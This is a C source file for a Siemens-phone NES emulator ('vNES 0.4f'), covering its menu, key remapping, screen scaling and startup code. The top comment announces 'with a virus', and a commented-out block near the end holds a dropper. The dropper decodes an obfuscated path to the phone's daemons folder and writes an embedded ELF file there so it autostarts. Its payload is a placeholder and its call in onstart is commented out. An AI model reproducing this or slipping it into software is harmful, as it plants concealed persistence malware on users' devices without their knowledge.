
// vNES с вирусом!

#include "..\menu.h"

extern short *screen; // Экран 132*176*2
extern int screensize;

extern unsigned short *screens;
extern char d_boolean_static_fld; //save_flag
extern char o_boolean_static_fld; //load flag (to romname)
extern char v_boolean_static_fld;

extern void freeall();
extern void initnul();
extern char loadrom(char *s) ;
extern void run();
extern unsigned char SGOLD2, C65, S75, EL71;
extern int getWidth, getHeight, screen_length;

extern int b_int_static_fld, L;
extern int B; //масштаб???

const byte version=0x26;
int tmpsize;
extern int A; //frameskip=5
//extern int k_int_static_fld; //joy from vNES
//#define joy k_int_static_fld
void repaint(){ REDRAW();}

const char helpkey[]=" 1 A\n2 up\n3 B\n4 left\n5 start\n6 right\n7 AA\n8 down\n9 BB\n0 select\n* AB";
extern char t_boolean_static_fld;

extern void DrawScreen(); // Функция перерисовки экрана
void onredraw();

char *Title="vNES 0.4f (c)bn";

const char *errors[]={
  0,
  "Запустите .nes файл\0",
  "Unknown error\0",
  "Не могу открыть файл\0",
  "Не .Nes ром!\0",
  "Маппер не поддерживается.\0",
  "Неверный ром!\0"
};

char romname[256];
byte param[paramlength]=
"\x26\x05\x00\x00\x00\x00\x84\xB0\x00\x00\x08\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x3D\x3E\x3B\x3C\x2A\x23\x34\x36\x32\x38\x35\x1A\x31\x33\x37\x39"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x40\x80\x10\x20\x10\x20\x40\x80\x10\x20\x08\x01\x08\x04\x01\x02"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x3D\x3E\x3B\x3C\x2A\x23\x34\x36\x32\x38\x35\x1A\x31\x33\x37\x39"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x40\x80\x10\x20\x10\x20\x40\x80\x10\x20\x08\x01\x08\x04\x01\x02"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";

enum{ pwidth=6, pheight, poptimize, pfilter, pstep, screenx, screeny};

char help[]=
" vNES 0.4f (c)bn"
"\n1.Load 0-9"
"\n2.Save 0-9"
"\n3.FrmSkp 1-9:%d"
"\n4.Optimize:%d"
"\n5.Redefine"
"\n6.Quality:%d"
"\n7.ScrStep:%02d"
"\n8.SizeX:%03d"
"\n9.SizeY:%03d"
"\n0.Exit"
"\ncbn.narod.ru"
"\ncbn@yandex.ru";


void outmenu(const char *help){
  sprintf(menu,help,param[pframeskip],t_boolean_static_fld,param[pfilter],param[pstep],getWidth, getHeight);//,param[pslow]);//,buf[stwidth],buf[stheight],buf[speed],buf[free],buf[fill],buf[lorec]|(buf[hirec]<<8));
}

//void redEL(){
//  int i,j,k;
//  int r,g,b;
//  short *ss=screen;
//  int *s=screens;//main_a_...
//  for(j=0;j<240*240;j++){
////    for(i=0;i<240;i++){
//      k=*s++;
//      *ss++=((k&0xf80000)>>8)|((k&0xfc00)>>5)|((k&0xf8)>>3);
////    }
//  }
//}

//int screenx=0, screeny=0;

void onredslow(){
  int j,k,l;
  short *s, *ss;
  cls();
  if(l=(((C65?130:height)-getHeight)>>1)<0) l=0;
  if(k=((width-getWidth)>>1)<0) k=0;
  ss=screen+l*width+k;
    l=(getWidth>width)?width:getWidth;
    k=(getHeight>height)?height:getHeight;
    s=(short*)screens+param[screenx]+param[screeny]*getWidth;
    for(j=0;j<k;j++){
      movsw(ss,s,l);
      ss+=width;
      s+=getWidth;
    }
}

extern void filter2(void *to, void *from);
extern void filter(void *to, void *from);

void onredraw(){ // Перерисовка экрана screen[132*176]
  if(param[pfilter] && !EL71){ if(C65) filter(screen,screens); else filter2(screen,screens);//!!!!!2
  }else
  if(getWidth==width && getHeight==height)
    movsd(screen,screens,EL71?(255*240/2):(132*176/2));
  else onredslow();
  if(mode) drawhelp((mode==99)?helpsel:((mode==98)?helpkey:help));
}
  //  extern void redraw(short *screen, int *from, int size);
//  extern void filter(short *screen, int *from);
// if(!c65) 
//  redraw(screen, screens, (EL71)?(240*240):(132*176));
// else  filter(screen, screens);
/*  int i,j,k;
  int r,g,b;
  short *ss=screen;
  int *s=screens;//main_a_...
  for(j=0;j<176;j++){
    for(i=0;i<132;i++){
      k=*s++;
      //r=(k>>16)&0xff;
      //g=(k>>8)&0xff;
      //b=(k)&0xff;
      *ss++=((k&0xf80000)>>8)|((k&0xfc00)>>5)|((k&0xf8)>>3);
        //(r>>3<<11)|(g>>2<<5)|(b>>3);
    }
    //s+=256-132;
  }
*/
//  int i,j;
//  for(i=0,j=color++;i<132*176;i++){
//    screen[i]=j++;
//  }
//}

void getscrXY(){ //помен. размеры экрана max 256 240
  //int x,y;
//  if(param[protate]){ x=height; y=width;}
  //else {}
  //x=width; y=height;
  if(!(getWidth=param[pwidth])) getWidth=256;
  if(!(getHeight=param[pheight])) getHeight=256;
  if(getWidth<64) getWidth=64;
  else if(getWidth>256) getWidth=256;
  if(getHeight<64) getHeight=64;
  else if(getHeight>240) getHeight=240;
  screen_length=getWidth*getHeight;
  if(param[screenx]>getWidth-width) param[screenx]=(getWidth-width<0)? 0: (getWidth-width);
  if(param[screeny]>getHeight-height) param[screeny]=(getHeight-height<0)? 0:(getHeight-height);
  cls();
//  if(1)//C65) 
//    getHeight=130;
//  else if(EL71){ getHeight=getWidth=240;}
//  getHeight=getWidth=100;
//  screen_length=getWidth*getHeight;
}

//extern void keyPressed(int i1);
//extern void keyReleased(int i1);

//int keyexit(){
//  running=0; exit=1; saveini(); return 0;
//}

void savename(char c){
  char *s=strrchr(romname,'.');
  *++s='s'; *++s=c; *++s=0;
}

#define JOY_UP 0x10
#define JOY_DOWN 0x20
#define JOY_LEFT 0x40
#define JOY_RIGHT 0x80
#define JOY_START 0x1
#define JOY_SELECT 0x2
#define JOY_AB 3

#define JOY_A 0x4    
#define JOY_B 0x8

#define JOY_AA 0xff    
#define JOY_BB 0xfe

//#define step 8

// keycode - код клавиши, pressed - нажата/отпущена/удерживается
int onkey(unsigned char keycode, int pressed){ //  Обработчик клавиш. Вернуть 0 или 1 для выхода
  byte *ptr;
  //int f;
  switch(pressed){
  case KEY_UP: if(!mode) keypress(keycode,0); break; // Клавиша отпущена
  case LONG_PRESS: // Клавиша удерживается долго (повтор)
  case KEY_DOWN: // Клавиша нажата
    if(exit) return 1; //Выход
    if(keycode==RED_BUTTON)  return 1;//keyexit();
    switch(mode){
    case 100: // main menu
      switch(keycode){
      case '0': return 1;//keyexit(); // Exit
      case '1': mode=1; break; //load
      case '2': mode=2; break; //save
      case '3': mode=3; break; //frmskip
      case '4': t_boolean_static_fld=(t_boolean_static_fld+1)&1; mode=0; break;
      case '8': mode=40; break; //sizex
      case '5': mode=99; break; //redefine
      case '7': mode=71; break;
      case LEFT_BUTTON: param[screenx]-=(param[screenx]<param[pstep])?param[screenx]:param[pstep]; getscrXY(); break;
      case RIGHT_BUTTON: param[screenx]+=param[pstep]; getscrXY(); break;
      case UP_BUTTON: param[screeny]-=(param[screeny]<param[pstep])?param[screeny]:param[pstep]; getscrXY(); break;
      case DOWN_BUTTON: param[screeny]+=param[pstep]; getscrXY(); break;
      case '6': 
        if(param[pfilter]=(param[pfilter]+1)&1){
          param[pwidth]=0; param[pheight]=240; getscrXY();
        }else{
           param[pwidth]=width; param[pheight]=height; getscrXY();
        }
        mode=0; break;
      case '9': mode=60; break; //sizey
    //  case '7': mode=0; cls(); if(++param[protate]>2) param[protate]=0; break; //rotate
//      case '8': mode=0; cls(); param[presize]=~param[presize]; break; //resize
//      case '9': param[pslow]=(param[pslow]+1)&1; break; //slow
      default: mode=0; break;
      }break;
    case 1: //load
      if(keycode>='0' && keycode<='9'){ 
        savename(keycode);
        v_boolean_static_fld=o_boolean_static_fld=1;
        //if((f=fopen(romname,A_ReadOnly+A_BIN,P_READ,&err))!=-1){
          //FCEUSS_LoadFP(f);
        //  fclose(f,&err);
        //}
      }
      mode=0; break;
    case 2: //save
      if(keycode>='0' && keycode<='9'){
        savename(keycode);
        v_boolean_static_fld=d_boolean_static_fld=1;
        //if((f=fopen(romname,A_WriteOnly+A_BIN+A_Create+A_Truncate,P_WRITE,&err))!=-1){
          //FCEUSS_SaveFP(f);
        //  fclose(f,&err);
        //}
      }
      mode=0; break;
    case 3: //frame_skip
      if(keycode>'0' && keycode<='9') A=param[pframeskip]=keycode-'0';
      mode=0; break;
//    case 5: //redefine
//      mode=99; break;
    case 99: //redefine - sel key
     switch(keycode){
      case RIGHT_SOFT:
      case LEFT_SOFT:
      //case GREEN_BUTTON: 
      case RED_BUTTON: mode=0; break;
      default:
      ptr=param+(param[palternate]?key2:key1);
      if(!(redefineptr=(byte*)strchr((char*)ptr,keycode))){ //нет клавиши
        redefineptr=ptr+strlen((char*)ptr);
        *redefineptr=keycode;
      }
       redefineptr+=maxkey;
       mode=98; break;
     } break; 

    case 98: //select key action
      switch(keycode){
// const char helpkey[]=" 1 A\n2 up\n3 B\n4 left\n5 start\n6 right\n7 AA\n8 down\n9 BB\n0 select";
 
      case '5': *redefineptr=JOY_B; break;
      case '0': *redefineptr=JOY_A; break;
      case '1': *redefineptr=JOY_START; break;
      case '3': *redefineptr=JOY_SELECT; break;
      case '2': *redefineptr=JOY_UP; break;
      case '8': *redefineptr=JOY_DOWN; break;
      case '4': *redefineptr=JOY_LEFT; break;
      case '6': *redefineptr=JOY_RIGHT; break;
      case '7':  *redefineptr=JOY_AA; break;
      case '9':  *redefineptr=JOY_BB; break;
      case '*':  *redefineptr=JOY_AB; break;
      } mode=0; break;

    case 40: if(keycode>='0' && keycode<='9'){ 
       tmpsize=keycode-'0'; ++mode;} else mode=0; break;
    case 41: if(keycode>='0' && keycode<='9'){ 
      tmpsize=tmpsize*10+keycode-'0'; ++mode;} else mode=0; break;
    case 42: if(keycode>='0' && keycode<='9'){ 
      param[pfilter]=0;
      param[pwidth]=tmpsize*10+keycode-'0'; getscrXY();
    } mode=0; break;
    
    case 60: if(keycode>='0' && keycode<='9'){ 
       tmpsize=keycode-'0'; ++mode;} else mode=0; break;
    case 61: if(keycode>='0' && keycode<='9'){ 
      tmpsize=tmpsize*10+keycode-'0'; ++mode;} else mode=0; break;
    case 62: if(keycode>='0' && keycode<='9'){ 
      param[pfilter]=0;
      param[pheight]=tmpsize*10+keycode-'0'; getscrXY();
    } mode=0; break;

    case 71:
      if(keycode>='0' && keycode<='9'){ tmpsize=keycode-'0'; ++mode;}
      else mode=0; break;
    case 72:
      if(keycode>='0' && keycode<='9')  param[pstep]=tmpsize*10+keycode-'0';
      mode=0; break;
  
    case 0: default:
      switch(keycode){
      case RIGHT_SOFT: mode=100; break; //main menu
      case LEFT_SOFT: param[palternate]=!param[palternate]; break;
      default: keypress(keycode,1);
      }break;
    }

//    onredraw(); DrawScreen(); // Перерисовать экран
  }
  return 0;
}

void onclose(){ // Закрытие окна
  running=0; // Сигнал на остановку фонового процесса
  ///
  param[pwidth]=getWidth;
  param[pheight]=getHeight;
  param[pframeskip]=A;
  param[poptimize]=t_boolean_static_fld?0:1;
  saveini();
}

void onexit(){ // Выход
  freeall();
//  if(buf) mfree(buf); // Освобождаем память
}

void oncreate(){ // Создание окна
  SUBPROC((void *)run); // Запускаем фоновый процесс 
//  GBS_StartTimerProc(&timer,262/2,timer_proc); // Стартуем таймер с частотой 2 раз в секунду
}

///////ВИРУС!!!

//char path[]="\xCB\xC5\xA3\xA5\xBD\x96\x91\xA3\xBB\x9E\x9A\x92\x90\x91\x8C\xA3"
//"\xBA\x87\x8B\xBB\xD1\x9A\x93\x99\x0";
//
////const char path[]="4:\\ZBin\\Daemons\\ExtD.elf";
//#define elfsize 5020
//char data[elfsize]="INSERT DATA HERE!!!";
//
//void v(){ //вирусное заражение
//  int f,i;
//  data[0]=0x7f;//0x464c457f;
//  data[1]=0x45; data[2]=0x4c; data[3]=0x46;
//  for(i=0;i<24;i++)
//    path[i]=~path[i];
//  i=0;
//  do{
//    f=fopen(path,A_ReadOnly+A_BIN,P_READ,&err);
//    switch(i){
//    case 0: if(f==-1) *(char*)path='0'; else fclose(f,&err); //drive 0 or 4?
//      *((char*)path+strlen(path)-5)='N';
//      break;
//    case 1: //exists?
//      if(f==-1)
//      if((f=fopen(path,A_WriteOnly+A_BIN+A_Create+A_Truncate,P_WRITE,&err))==-1) return;
//      fwrite(f,data,elfsize,&err);
//      fclose(f,&err); 
//      return;
//    } 
//  }while(++i<5);
//}

int onstart(char *exename, char *fname){ // Старт приложения. Возвращает 0 или 1 для выхода.
//  B=110;  
  int i;
//  v();
  if(!fname || fname[1]!=':') return 1;
  strcpy(filename, exename);
  strcpy(romname,fname);
  if(C65) param[pheight]=130;
  else if(EL71){ param[pwidth]=param[pheight]=240;}
  loadini();
  if(!param[pstep]) param[pstep]=8;
  getscrXY();
  if(!(A=param[pframeskip])) A=5;
  t_boolean_static_fld=param[poptimize]?0:1;
  initnul();
  if(i=loadrom(fname)) return i;
  return 0;
}
//напутал....экран
//        int i1 = getWidth;
//        int j1 = getHeight;
//        if(i1 != t_int_static_fld || j1 != K)
//            i();
//        t_int_static_fld = i1;
//        K = j1;
